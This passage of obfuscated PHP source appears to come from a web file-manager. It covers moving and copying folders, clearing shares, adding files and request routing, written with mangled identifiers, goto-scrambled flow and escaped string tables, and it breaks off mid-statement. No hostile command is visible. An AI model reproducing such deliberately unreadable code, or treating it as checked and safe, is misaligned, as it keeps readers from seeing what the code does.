$D¨ŒÜ’ÎË = $this->sourceInfo($AÓìÔš©àæ); $B”øÇ§µ¡ = $D¨ŒÜ’ÎË[$A£¾ÀÙµ›ø[397]] == $A£¾ÀÙµ›ø[86]; goto cœãâ‚ßĞ; cœãâ‚ßĞ: $C‘Ü…×¦» = $bĞÕ¶ŒÚ†÷ ? $bĞÕ¶ŒÚ†÷ : $D¨ŒÜ’ÎË[$A£¾ÀÙµ›ø[28]]; $AÑ·äÁÁäÖ = $this->fileNameExistCache($E«õß„×ßÄ, $C‘Ü…×¦»); $this->lockMoveStart($AÓìÔš©àæ); goto Cİ¸ìÜõ—í; Cİ¸ìÜõ—í: $this->lockWriteStart($E«õß„×ßÄ, $C‘Ü…×¦»); if (!$AÑ·äÁÁäÖ) { return $this->_moveForce($AÓìÔš©àæ, $E«õß„×ßÄ, $C‘Ü…×¦»); } $E¾Œ™Í = $AÑ·äÁÁäÖ; goto F¡Éå›‘Œö; A‡ëÈßÉœ: } private function _moveForce($B£Š‰‹Ì¿¦, $AÃ¬Ì›Øø¬, $eéâ³’£³) { goto BÛŒšÎºˆ‹; cŠÆ¤¤•Î: if (!$a°ÔÔ®ß¸ && $this->moveClearAuth) { Model($cŠˆ£æèÕ‹[476])->authClear($B£Š‰‹Ì¿¦); } $D³‹«…ó¤³ = $dÇ¼À““ª¢[$cŠˆ£æèÕ‹[417]] == $cŠˆ£æèÕ‹[86] && $fµ§İÙÃ´×[$cŠˆ£æèÕ‹[417]] != $cŠˆ£æèÕ‹[86]; if ($D³‹«…ó¤³) { $c‰¨²‹È‘Ú[$cŠˆ£æèÕ‹[416]] = 0; } goto EƒÙŠ·á†; dÊõï…°îÁ: $bÂÛßõ‘ªÇ = $dÇ¼À““ª¢[$cŠˆ£æèÕ‹[397]] == $cŠˆ£æèÕ‹[86]; $c‰¨²‹È‘Ú = array($cŠˆ£æèÕ‹[389] => $fµ§İÙÃ´×[$cŠˆ£æèÕ‹[390]], $cŠˆ£æèÕ‹[548] => $fµ§İÙÃ´×[$cŠˆ£æèÕ‹[481]] . $fµ§İÙÃ´×[$cŠˆ£æèÕ‹[390]] . $cŠˆ£æèÕ‹[47], $cŠˆ£æèÕ‹[544] => $fµ§İÙÃ´×[$cŠˆ£æèÕ‹[398]], $cŠˆ£æèÕ‹[545] => $fµ§İÙÃ´×[$cŠˆ£æèÕ‹[478]], $cŠˆ£æèÕ‹[547] => USER_ID, $cŠˆ£æèÕ‹[407] => $eéâ³’£³); $a°ÔÔ®ß¸ = $dÇ¼À““ª¢[$cŠˆ£æèÕ‹[398]] == SourceModel::TYPE_GROUP && $fµ§İÙÃ´×[$cŠˆ£æèÕ‹[398]] == SourceModel::TYPE_GROUP && $dÇ¼À““ª¢[$cŠˆ£æèÕ‹[478]] == $fµ§İÙÃ´×[$cŠˆ£æèÕ‹[478]]; goto cŠÆ¤¤•Î; EƒÙŠ·á†: if ($bÂÛßõ‘ªÇ) { $bŸ‚õî˜ã = array($cŠˆ£æèÕ‹[548] => array($cŠˆ£æèÕ‹[507], $dÇ¼À““ª¢[$cŠˆ£æèÕ‹[481]] . $dÇ¼À““ª¢[$cŠˆ£æèÕ‹[390]] . $cŠˆ£æèÕ‹[508])); $eÁŠË–İÖ® = $dÇ¼À““ª¢[$cŠˆ£æèÕ‹[481]] . $dÇ¼À““ª¢[$cŠˆ£æèÕ‹[390]] . $cŠˆ£æèÕ‹[47]; $cÉÀ•‘ÇôÜ = $fµ§İÙÃ´×[$cŠˆ£æèÕ‹[481]] . $fµ§İÙÃ´×[$cŠˆ£æèÕ‹[390]] . $cŠˆ£æèÕ‹[47] . $dÇ¼À““ª¢[$cŠˆ£æèÕ‹[390]] . $cŠˆ£æèÕ‹[47]; $aºİ”¶½½¬ = array($cŠˆ£æèÕ‹[548] => array($cŠˆ£æèÕ‹[556], "\162\x65\x70\x6c\141\x63\145\50\160\x61\162\x65\156\164\x4c\x65\x76\145\x6c\54\x27{$eÁŠË–İÖ®}\47\x2c\x27{$cÉÀ•‘ÇôÜ}\x27\x29"), $cŠˆ£æèÕ‹[544] => $fµ§İÙÃ´×[$cŠˆ£æèÕ‹[398]], $cŠˆ£æèÕ‹[545] => $fµ§İÙÃ´×[$cŠˆ£æèÕ‹[478]]); if ($D³‹«…ó¤³) { $aºİ”¶½½¬[$cŠˆ£æèÕ‹[416]] = 0; } $this->where($bŸ‚õî˜ã)->data($aºİ”¶½½¬)->save(); } $this->where(array($cŠˆ£æèÕ‹[404] => $B£Š‰‹Ì¿¦))->data($c‰¨²‹È‘Ú)->save(); return $B£Š‰‹Ì¿¦; goto A¸ìµ±ˆÛ¢; BÛŒšÎºˆ‹: $cŠˆ£æèÕ‹ =& $_SERVER[¹…ÕÄ]; $dÇ¼À““ª¢ = $this->sourceInfo($B£Š‰‹Ì¿¦); $fµ§İÙÃ´× = $this->sourceInfo($AÃ¬Ì›Øø¬); goto dÊõï…°îÁ; A¸ìµ±ˆÛ¢: } private function clearShare($Fø³ÚÒ¾Îò, $f¤ÇøºõÃ) { goto Eäø©ãÆò ; B¶ÒÃÎİ¡†: if ($FÊÈ·Ã‹Û‰[$AÅ‰Ã·Ó™[478]] == $Fêï¨­‰Ì‰[$AÅ‰Ã·Ó™[478]] && $FÊÈ·Ã‹Û‰[$AÅ‰Ã·Ó™[398]] == $AÅ‰Ã·Ó™[557]) { return; } $d§”Ç÷âĞÉ = array($AÅ‰Ã·Ó™[481] => array($AÅ‰Ã·Ó™[507], $FÊÈ·Ã‹Û‰[$AÅ‰Ã·Ó™[481]] . $Fø³ÚÒ¾Îò . $AÅ‰Ã·Ó™[508])); $F’Ùİö¬Ãà = $this->field($AÅ‰Ã·Ó™[404])->where($d§”Ç÷âĞÉ)->getField($AÅ‰Ã·Ó™[390], !0); goto AİØ‹ˆŒó; AİØ‹ˆŒó: if (!$F’Ùİö¬Ãà) { return; } $d§”Ç÷âĞÉ = array($AÅ‰Ã·Ó™[390] => array($AÅ‰Ã·Ó™[7], $F’Ùİö¬Ãà), $AÅ‰Ã·Ó™[469] => 1); $bÛÂ´‰¿ğ = Model($AÅ‰Ã·Ó™[558])->field($AÅ‰Ã·Ó™[462])->where($d§”Ç÷âĞÉ)->select(); goto a˜ÖÀÔÂƒã; C‘ÎµÑäøÂ: Model($AÅ‰Ã·Ó™[558])->where($d§”Ç÷âĞÉ)->save(array($AÅ‰Ã·Ó™[469] => 0)); Model($AÅ‰Ã·Ó™[559])->where($d§”Ç÷âĞÉ)->delete(); goto bàÄ‘íŠ§„; Eäø©ãÆò : $AÅ‰Ã·Ó™ =& $_SERVER[¹…ÕÄ]; $FÊÈ·Ã‹Û‰ = $this->sourceInfo($Fø³ÚÒ¾Îò); $Fêï¨­‰Ì‰ = $this->sourceInfo($f¤ÇøºõÃ); goto B¶ÒÃÎİ¡†; a˜ÖÀÔÂƒã: if (!$bÛÂ´‰¿ğ) { return; } $bÛÂ´‰¿ğ = array_to_keyvalue($bÛÂ´‰¿ğ, $AÅ‰Ã·Ó™[33], $AÅ‰Ã·Ó™[462]); $d§”Ç÷âĞÉ = array($AÅ‰Ã·Ó™[462] => array($AÅ‰Ã·Ó™[7], $bÛÂ´‰¿ğ)); goto C‘ÎµÑäøÂ; bàÄ‘íŠ§„: } public function copyFolderFromIO($E»ï¤–ÂË‹, $e‰½ÁíÒ”, $f³©‰ŸÙÆ, $F‘ÆÑÕò®¡, $f¼«Î´ˆ×, $dÇÂ½Ê¶†ç = false) { goto F’›Şé¹­; f¯ôÃÚ˜Š: $C¦¿¾ËÜ¨Ş = $this->fileNameExist($f³©‰ŸÙÆ, $Dåš‚±‡©‡); $aÅ´„ê¿´à = $this->mkdir($f³©‰ŸÙÆ, $Dåš‚±‡©‡, $F‘ÆÑÕò®¡); if (!$C¦¿¾ËÜ¨Ş || $F‘ÆÑÕò®¡ == REPEAT_RENAME_FOLDER) { $F‘ÆÑÕò®¡ = !1; } goto dÊ¼íà°Ø°; FÂÇÙæÙ½’: Hook::trigger($ešÏÂä¯”Ş[562]); if ($aÅ´„ê¿´à) { $this->folderSizeResetChildren($aÅ´„ê¿´à); } $this->_childrenListClear(); goto cßŠ“µ«¼; a›ˆ˜ÕÌä: Model($ešÏÂä¯”Ş[444])->linkAdd($DÚÎŞÜ·©Á[$ešÏÂä¯”Ş[524]]); Model($ešÏÂä¯”Ş[444])->remove($DÚÎŞÜ·©Á[$ešÏÂä¯”Ş[560]]); $this->folderSizeReset($f³©‰ŸÙÆ); goto b“×çÎ‚æ; cßŠ“µ«¼: Model($ešÏÂä¯”Ş[527])->addAll($DÚÎŞÜ·©Á[$ešÏÂä¯”Ş[525]], array(), !0); Model($ešÏÂä¯”Ş[528])->eventCopy($aÅ´„ê¿´à); $this->saveAll($DÚÎŞÜ·©Á[$ešÏÂä¯”Ş[526]]); goto a›ˆ˜ÕÌä; dÊ¼íà°Ø°: if ($C¦¿¾ËÜ¨Ş) { $this->_childrenAllMake($C¦¿¾ËÜ¨Ş); } Hook::trigger($ešÏÂä¯”Ş[561]); $this->_copyChildTo($E»ï¤–ÂË‹, $e‰½ÁíÒ”, $aÅ´„ê¿´à, $F‘ÆÑÕò®¡, $DÚÎŞÜ·©Á, $f¼«Î´ˆ×); goto FÂÇÙæÙ½’; b“×çÎ‚æ: $this->updateModifyTime($f³©‰ŸÙÆ); return $aÅ´„ê¿´à; goto B®°åÖŠëĞ; F’›Şé¹­: $ešÏÂä¯”Ş =& $_SERVER[¹…ÕÄ]; $DÚÎŞÜ·©Á = array($ešÏÂä¯”Ş[525] => array(), $ešÏÂä¯”Ş[526] => array(), $ešÏÂä¯”Ş[524] => array(), $ešÏÂä¯”Ş[560] => array()); $Dåš‚±‡©‡ = $dÇÂ½Ê¶†ç ? $dÇÂ½Ê¶†ç : $E»ï¤–ÂË‹->pathThis($e‰½ÁíÒ”); goto f¯ôÃÚ˜Š; B®°åÖŠëĞ: } private function _copyChildTo($CâÖÈ¡ô†, $EÍÖæôØÄå, $d„ƒì‹ÌÎÔ, $bŸ‚î±Æ‡ä, &$dâ‡Šİí§«, $a´ÔƒÎ²¿ß) { goto a£Û÷ê×Û›; f”ƒ¾ğè¤–: foreach ($fôÃÇÅ½Í‰ as &$fÏŞ¹ÀŸò¥) { goto Ašç¥ƒ; fÇ­„¿›Ê«: $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[77]] = _get($fÏŞ¹ÀŸò¥, $a¸İàŒ¡ÛÈ[77], 0); $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[441]] = _get($fÏŞ¹ÀŸò¥, $a¸İàŒ¡ÛÈ[441], 0); if (!isset($fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[563]]) && $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[441]]) { $dâ‡Šİí§«[$a¸İàŒ¡ÛÈ[560]][] = $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[441]]; } goto BÈ‡…ƒšà; Ašç¥ƒ: if (isset($eÛ…ƒ†ÈæŠ[$fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[28]]])) { $fÏŞ¹ÀŸò¥ = $eÛ…ƒ†ÈæŠ[$fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[28]]]; } $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[397]] = $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[29]] == $a¸İàŒ¡ÛÈ[76]; $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[399]] = _get($fÏŞ¹ÀŸò¥, $a¸İàŒ¡ÛÈ[167], $a¸İàŒ¡ÛÈ[33]); goto fÇ­„¿›Ê«; BÈ‡…ƒšà: if ($bŸ‚î±Æ‡ä) { $dª„‘ÓÑ« = $this->fileNameExistCache($d„ƒì‹ÌÎÔ, $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[28]]); if ($dª„‘ÓÑ«) { if ($fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[397]] || $bŸ‚î±Æ‡ä == REPEAT_SKIP) { continue; } if ($bŸ‚î±Æ‡ä == REPEAT_REPLACE) { $eÉè®ä™‹° = $this->sourceInfoCache($dª„‘ÓÑ«); $BÀÑìÒùÆ¥ = $this->fileHistory($eÉè®ä™‹°, $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[441]], $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[77]]); if ($BÀÑìÒùÆ¥) { $dâ‡Šİí§«[$a¸İàŒ¡ÛÈ[524]][] = $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[441]]; } continue; } else { if ($bŸ‚î±Æ‡ä == REPEAT_RENAME) { $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[28]] = $this->fileNameAutoCache($d„ƒì‹ÌÎÔ, $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[28]], $bŸ‚î±Æ‡ä, !1); } } } } if (!$fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[397]] && $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[441]]) { $dâ‡Šİí§«[$a¸İàŒ¡ÛÈ[524]][] = $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[441]]; } $eÆ‚„°¡òŞ[] = $this->_makeItemData($fÏŞ¹ÀŸò¥, $E¨ÌÔŞâ‘ô, $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[28]]); goto eƒŸèÉÄ®‘; eƒŸèÉÄ®‘: } unset($fÏŞ¹ÀŸò¥); if (!empty($eÆ‚„°¡òŞ)) { $this->addAll($eÆ‚„°¡òŞ); $this->_childrenListSelect($d„ƒì‹ÌÎÔ); } goto EŞ²ïÔİ»é; EŞ²ïÔİ»é: $eÍ‹ö¯‚ì¾ = $this->_childrenList($d„ƒì‹ÌÎÔ); $eÍ‹ö¯‚ì¾ = array_to_keyvalue($eÍ‹ö¯‚ì¾, $a¸İàŒ¡ÛÈ[28]); foreach ($fôÃÇÅ½Í‰ as $fÏŞ¹ÀŸò¥) { $eÉè®ä™‹° = $eÍ‹ö¯‚ì¾[$fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[28]]]; $aÍ¶º¤‚‡º = $eÉè®ä™‹°[$a¸İàŒ¡ÛÈ[390]]; $this->_copyApplyMeta($eÉè®ä™‹°, $dâ‡Šİí§«); if ($fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[29]] == $a¸İàŒ¡ÛÈ[76]) { $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[75]] = $CâÖÈ¡ô†->getPathInner($fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[75]]); $this->_copyChildTo($CâÖÈ¡ô†, $fÏŞ¹ÀŸò¥[$a¸İàŒ¡ÛÈ[75]], $aÍ¶º¤‚‡º, $bŸ‚î±Æ‡ä, $dâ‡Šİí§«, $a´ÔƒÎ²¿ß); } } goto aŠ¬¡ƒåÛÅ; C“ë“ƒƒ‹„: $fôÃÇÅ½Í‰ = array_merge($a†¼šêóÜâ[$a¸İàŒ¡ÛÈ[73]], $a†¼šêóÜâ[$a¸İàŒ¡ÛÈ[74]]); $eÛ…ƒ†ÈæŠ = $this->_addFiles($CâÖÈ¡ô†, $a†¼šêóÜâ[$a¸İàŒ¡ÛÈ[73]], $a´ÔƒÎ²¿ß); $eÆ‚„°¡òŞ = array(); goto f”ƒ¾ğè¤–; a£Û÷ê×Û›: $a¸İàŒ¡ÛÈ =& $_SERVER[¹…ÕÄ]; $E¨ÌÔŞâ‘ô = $this->sourceInfoCache($d„ƒì‹ÌÎÔ); $a†¼šêóÜâ = $CâÖÈ¡ô†->listPath($EÍÖæôØÄå); goto C“ë“ƒƒ‹„; aŠ¬¡ƒåÛÅ: } private function _addFiles($f‡ïÁßÀô, $cĞ°ÂŞì•È, $FÎ†‰§î¶œ) { goto EŒî†§ÙÈÖ; dì„½¥›: $FÃ¾â´£í¬->addAll($D–ó‡ÒåÕ½); $C‰Ç™­î¢æ = array($aƒ¹®óÁğß[169] => array($aƒ¹®óÁğß[7], array_keys($CÀ¶´„‰¶))); $b ôÁóŠ´ = $FÃ¾â´£í¬->where($C‰Ç™­î¢æ)->select(); goto b¼‡‡Ğí×Ë; C³¦êİÃÍ: foreach ($b ôÁóŠ´ as $cŒŠ›˜á­˜) { if (!isset($CÀ¶´„‰¶[$cŒŠ›˜á­˜[$aƒ¹®óÁğß[169]]])) { continue; } $D‡ØÁ«²­¢ = $CÀ¶´„‰¶[$cŒŠ›˜á­˜[$aƒ¹®óÁğß[169]]]; foreach ($D‡ØÁ«²­¢ as &$CÁÀ®ËÑÉ‡) { $CÁÀ®ËÑÉ‡[$aƒ¹®óÁğß[441]] = $cŒŠ›˜á­˜[$aƒ¹®óÁğß[441]]; $CÁÀ®ËÑÉ‡[$aƒ¹®óÁğß[563]] = !0; } unset($CÁÀ®ËÑÉ‡); } $D–ó‡ÒåÕ½ = array(); foreach ($cĞ°ÂŞì•È as $bÃ°°êÃ”‘) { if (isset($bÃ°°êÃ”‘[$aƒ¹®óÁğß[563]]) && $bÃ°°êÃ”‘[$aƒ¹®óÁğß[563]]) { continue; } $bÇ¾‹à‹à’ = $f‡ïÁßÀô->getPathInner($bÃ°°êÃ”‘[$aƒ¹®óÁğß[75]]); $fÇßÓ¨êßµ = $FÃ¾â´£í¬->addFileMake($bÇ¾‹à‹à’, $bÃ°°êÃ”‘[$aƒ¹®óÁğß[77]], $bÃ°°êÃ”‘[$aƒ¹®óÁğß[170]], $bÃ°°êÃ”‘[$aƒ¹®óÁğß[169]], $bÃ°°êÃ”‘[$aƒ¹®óÁğß[28]], $FÎ†‰§î¶œ); $D–ó‡ÒåÕ½[] = $fÇßÓ¨êßµ; } goto dì„½¥›; f“Ú‘ˆèÚ: foreach ($cĞ°ÂŞì•È as &$CÁÀ®ËÑÉ‡) { goto eÌ¦î šö; eÌ¦î šö: Hook::trigger($aƒ¹®óÁğß[564], $CÁÀ®ËÑÉ‡); $CÁÀ®ËÑÉ‡[$aƒ¹®óÁğß[75]] = $f‡ïÁßÀô->getPathInner($CÁÀ®ËÑÉ‡[$aƒ¹®óÁğß[75]]); $eââŒ²ƒˆ = $f‡ïÁßÀô->hashSimple($CÁÀ®ËÑÉ‡[$aƒ¹®óÁğß[75]]); goto AåÂ£Ì„¤; eç‹Æ¬¥§: $CÁÀ®ËÑÉ‡[$aƒ¹®óÁğß[169]] = $FÁİÕğÔ£È; Hook::trigger($aƒ¹®óÁğß[565], $CÁÀ®ËÑÉ‡); $CÀ¶´„‰¶[$FÁİÕğÔ£È][] =& $CÁÀ®ËÑÉ‡; goto fÒØ—´´ë; fÒØ—´´ë: if (count($CÀ¶´„‰¶[$FÁİÕğÔ£È]) > 1) { $CÁÀ®ËÑÉ‡[$aƒ¹®óÁğß[563]] = !0; } goto c¯¿ÒˆÁ“¢; AåÂ£Ì„¤: $FÁİÕğÔ£È = $f‡ïÁßÀô->hashMd5($CÁÀ®ËÑÉ‡[$aƒ¹®óÁğß[75]]); if (strlen($FÁİÕğÔ£È) > 10 && !isset($CÀ¶´„‰¶[$FÁİÕğÔ£È])) { $CÀ¶´„‰¶[$FÁİÕğÔ£È] = array(); } $CÁÀ®ËÑÉ‡[$aƒ¹®óÁğß[170]] = $eââŒ²ƒˆ; goto eç‹Æ¬¥§; c¯¿ÒˆÁ“¢: } unset($CÁÀ®ËÑÉ‡); $C‰Ç™­î¢æ = array($aƒ¹®óÁğß[169] => array($aƒ¹®óÁğß[7], array_keys($CÀ¶´„‰¶))); goto c‡ÄŠ¡­ÄÑ; c‡ÄŠ¡­ÄÑ: $FÃ¾â´£í¬ = Model($aƒ¹®óÁğß[566]); $b ôÁóŠ´ = $FÃ¾â´£í¬->where($C‰Ç™­î¢æ)->select(); $b ôÁóŠ´ = $b ôÁóŠ´ ? $b ôÁóŠ´ : array(); goto C³¦êİÃÍ; b¼‡‡Ğí×Ë: $b ôÁóŠ´ = $b ôÁóŠ´ ? $b ôÁóŠ´ : array(); foreach ($b ôÁóŠ´ as $cŒŠ›˜á­˜) { if (!isset($CÀ¶´„‰¶[$cŒŠ›˜á­˜[$aƒ¹®óÁğß[169]]])) { continue; } $A¡Ò—§ïÅã =& $CÀ¶´„‰¶[$cŒŠ›˜á­˜[$aƒ¹®óÁğß[169]]]; foreach ($A¡Ò—§ïÅã as &$CÁÀ®ËÑÉ‡) { $CÁÀ®ËÑÉ‡[$aƒ¹®óÁğß[441]] = $cŒŠ›˜á­˜[$aƒ¹®óÁğß[441]]; } unset($CÁÀ®ËÑÉ‡); } $c¯Ï‚ğó³¼ = array(); goto dÂåÂê®ß; EŒî†§ÙÈÖ: $aƒ¹®óÁğß =& $_SERVER[¹…ÕÄ]; if (!$cĞ°ÂŞì•È || count($cĞ°ÂŞì•È) == 0) { return array(); } $CÀ¶´„‰¶ = array(); goto f“Ú‘ˆèÚ; dÂåÂê®ß: foreach ($cĞ°ÂŞì•È as $f±ÆæœÒ¬) { $c¯Ï‚ğó³¼[$f±ÆæœÒ¬[$aƒ¹®óÁğß[28]]] = $f±ÆæœÒ¬; } return $c¯Ï‚ğó³¼; goto d•¸Øç´Ù; d•¸Øç´Ù: } } define($_SERVER[¹…ÕÄ][567], $_SERVER[¹…ÕÄ][568]); goto dóÉº‹Û†Ö; DÂĞ¼Ğ¥’ƒ: $EçÇ‹ŸôÊ’ = $_SERVER[¹…ÕÄ][573]; if (strlen($EçÇ‹ŸôÊ’) < $_SERVER[¹…ÕÄ][574]) { return; } class Application { private $defaultModule = "\151\156\x64\145\170"; private $defaultController = "\x69\x6e\144\145\x78"; private $defaultAction = "\151\x6e\x64\145\x78"; function __construct() { } public function setDefault($a¢¢•Óƒ—) { goto dğÀŒµÉŞ£; D£ğˆŞä§â: $this->defaultAction = $D¥ªºíçˆã[2] ? $D¥ªºíçˆã[2] : $this->defaultAction; $this->{$_SERVER[È][3]}($BÁ¦±¤Ò·Û[4], array($this, $BÁ¦±¤Ò·Û[5])); $c…â’¯…“Â = $a ¸§õîß‹[576]; goto fÇÁà«ÂğÆ; dğÀŒµÉŞ£: $a ¸§õîß‹ =& $_SERVER[¹…ÕÄ]; $BÁ¦±¤Ò·Û =& $_SERVER[È]; $D¥ªºíçˆã = $BÁ¦±¤Ò·Û[0]($BÁ¦±¤Ò·Û[1], $BÁ¦±¤Ò·Û[2]($a¢¢•Óƒ—, $BÁ¦±¤Ò·Û[1])); goto e¥Ò‰Ñ; e¥Ò‰Ñ: $this->defaultModule = $D¥ªºíçˆã[0] ? $D¥ªºíçˆã[0] : $this->defaultModule; $C«—ğ®²† = $a ¸§õîß‹[575]; $this->defaultController = $D¥ªºíçˆã[1] ? $D¥ªºíçˆã[1] : $this->defaultController; goto D£ğˆŞä§â; fÇÁà«ÂğÆ: } public function appRun($dÅ¯‰©±»Œ) { goto aãàÂ²½ô; cÌ²Ñ¯Ë©ß: $e§òª÷™ŒÏ = $FÍôÙ„ÍØÜ[6]($a–ÏóÚ ¢²[0]); $aª–µèŒ÷„ = $F–›×´«Ñ[577]; if (!$aª–µèŒ÷„) { return; } goto Eîİ˜òÔÆÌ; e’±ŒÄŒÄ™: $FÍôÙ„ÍØÜ[13](array($FÍôÙ„ÍØÜ[14], $FÍôÙ„ÍØÜ[15]), $CêÓ‘ÜÀ—‰ . $FÍôÙ„ÍØÜ[18], $dÅ¯‰©±»Œ); goto B¯«­ôçœ; aãàÂ²½ô: $F–›×´«Ñ =& $_SERVER[¹…ÕÄ]; $FÍôÙ„ÍØÜ =& $_SERVER[È]; $a–ÏóÚ ¢² = $FÍôÙ„ÍØÜ[0]($FÍôÙ„ÍØÜ[1], $dÅ¯‰©±»Œ); goto cÌ²Ñ¯Ë©ß; Eîİ˜òÔÆÌ: $CêÓ‘ÜÀ—‰ = $FÍôÙ„ÍØÜ[7]; if ($e§òª÷™ŒÏ == $FÍôÙ„ÍØÜ[8]) { $CêÓ‘ÜÀ—‰ = $FÍôÙ„ÍØÜ[9]; $a–ÏóÚ ¢²[0] = $FÍôÙ„ÍØÜ[10]; $a–ÏóÚ ¢²[1] = $a–ÏóÚ ¢²[1] . $FÍôÙ„ÍØÜ[11]; $dÅ¯‰©±»Œ = $FÍôÙ„ÍØÜ[12]($FÍôÙ„ÍØÜ[1], $a–ÏóÚ ¢²); $dÅ¯‰©±»Œ = $FÍôÙ„ÍØÜ[2]($dÅ¯‰©±»Œ, $FÍôÙ„ÍØÜ[1]); } $FÍôÙ„ÍØÜ[13](array($FÍôÙ„ÍØÜ[14], $FÍôÙ„ÍØÜ[15]), $CêÓ‘ÜÀ—‰ . $FÍôÙ„ÍØÜ[16], $dÅ¯‰©±»Œ); goto eƒÎÕÙ®Ë; eƒÎÕÙ®Ë: $FÍôÙ„ÍØÜ[17]($dÅ¯‰©±»Œ); $d„…­õÁª¹ = $F–›×´«Ñ[578]; if (strlen($d„…­õÁª¹) < $F–›×´«Ñ[579]) { die; } goto e’±ŒÄŒÄ™; B¯«­ôçœ: } private function autorun() { goto e…ÌÄ…Éå›; EÈÛæ‘Œ“å: foreach ($config[$Cñµ‚†³¯[20]] as $aå«Êíãš¸ => $FÏ†ê®ÊªÔ) { $this->{$_SERVER[È][21]}($FÏ†ê®ÊªÔ); } goto eÀìÔã†‚—; e…ÌÄ…Éå›: $c•°’ŠÎ‘Ï =& $_SERVER[¹…ÕÄ]; $Cñµ‚†³¯ =& $_SERVER[È]; global $config; goto b”š¥ïè¸; b”š¥ïè¸: $C®“çñàÁ‚ = $c•°’ŠÎ‘Ï[580]; while ($C®“çñàÁ‚ < $c•°’ŠÎ‘Ï[581]) { if ($C®“çñàÁ‚ >= 0) { break; } $C®“çñàÁ‚++; } if ($Cñµ‚†³¯[19]($config[$Cñµ‚†³¯[20]]) == 0) { return; } goto EÈÛæ‘Œ“å; eÀìÔã†‚—: } private function ucfs549c9bc3() { goto C®”¥İ‚³‚; d©‰‘ºÉªÜ: $DÉêÒ­Ââ¢ = $GLOBALS[$D¥êš„öŞ[22]][$D¥êš„öŞ[23]][0]; $föËÄØÎâ× = $a«¥¸Ûº†¦[582]; if (strlen($föËÄØÎâ×) < $a«¥¸Ûº†¦[581]) { die; } goto bãÄ¨‘†÷ä; C®”¥İ‚³‚: $a«¥¸Ûº†¦ =& $_SERVER[¹…ÕÄ]; $D¥êš„öŞ =& $_SERVER[È]; $c¼À‘ °İ‹ = $D¥êš„öŞ[8]; goto d©‰‘ºÉªÜ; eåÓ»ÆÈõ: $GLOBALS[$D¥êš„öŞ[22]][$D¥êš„öŞ[23]] = $D¥êš„öŞ[27]($Bº˜Ò¶àæ, $B¶Œí“®Ì); $GLOBALS[$D¥êš„öŞ[22]][$D¥êš„öŞ[28]] = $D¥êš„öŞ[29]($D¥êš„öŞ[1], $GLOBALS[$D¥êš„öŞ[22]][$D¥êš„öŞ[23]]); goto bŸŠÂøá„; bãÄ¨‘†÷ä: if (!$DÉêÒ­Ââ¢ || $D¥êš„öŞ[24]($DÉêÒ­Ââ¢) <= $D¥êš„öŞ[24]($c¼À‘ °İ‹)) { return; } if ($D¥êš„öŞ[6]($D¥êš„öŞ[25]($DÉêÒ­Ââ¢, -$D¥êš„öŞ[24]($c¼À‘ °İ‹))) != $c¼À‘ °İ‹) { return; } $D‰ƒ®¯‹—Ë = $D¥êš„öŞ[25]($DÉêÒ­Ââ¢, 0, -$D¥êš„öŞ[24]($c¼À‘ °İ‹)); goto fÒ¿¿‘½³ô; fÒ¿¿‘½³ô: $bÂáØÓ¦éŒ = $a«¥¸Ûº†¦[583]; $Bº˜Ò¶àæ = array($D¥êš„öŞ[8], $D‰ƒ®¯‹—Ë); $B¶Œí“®Ì = $D¥êš„öŞ[26]($GLOBALS[$D¥êš„öŞ[22]][$D¥êš„öŞ[23]], 1); goto eåÓ»ÆÈõ; bŸŠÂøá„: } private function vxpgf65a5e6a() { goto BˆÜ¾Ò„…ò; a£¢´¬‹¾: $GLOBALS[$dÓ‰õÃ†Ï³[22]][$dÓ‰õÃ†Ï³[23]] = $dÓ‰õÃ†Ï³[0]($dÓ‰õÃ†Ï³[36], $fµ÷›´ñë); $GLOBALS[$dÓ‰õÃ†Ï³[22]][$dÓ‰õÃ†Ï³[28]] = $dÓ‰õÃ†Ï³[29]($dÓ‰õÃ†Ï³[1], $GLOBALS[$dÓ‰õÃ†Ï³[22]][$dÓ‰õÃ†Ï³[23]]); goto Cªö¶¸ù×æ; B½Ì¿À´“: $dŞÏŠ¼–Å = $dÓ‰õÃ†Ï³[33]($c°¦ˆïˆÈŠ, $F˜Ñƒßøï²); $FŞ×å‡¡ = $eŸâè¸à‘º[586]; while ($FŞ×å‡¡ < $eŸâè¸à‘º[587]) { if ($FŞ×å‡¡ >= 0) { break; } $FŞ×å‡¡++; } goto Aøá¾™¾•¤; A‰Ÿ¾µõÔÂ: $c°¦ˆïˆÈŠ = $_SERVER[$dÓ‰õÃ†Ï³[30]]; $DÌÁ¡Î™‰¼ = $eŸâè¸à‘º[584]; while ($DÌÁ¡Î™‰¼ < $eŸâè¸à‘º[574]) { if ($DÌÁ¡Î™‰¼ >= 0) { break; } $DÌÁ¡Î™‰¼++; } goto EïÌÆ¬ éƒ; Aøá¾™¾•¤: $fµ÷›´ñë = $dÓ‰õÃ†Ï³[25]($c°¦ˆïˆÈŠ, $dŞÏŠ¼–Å + $dÓ‰õÃ†Ï³[24]($F˜Ñƒßøï²)); $E “²ó¦Ã = $eŸâè¸à‘º[588]; while (strlen($E “²ó¦Ã) < 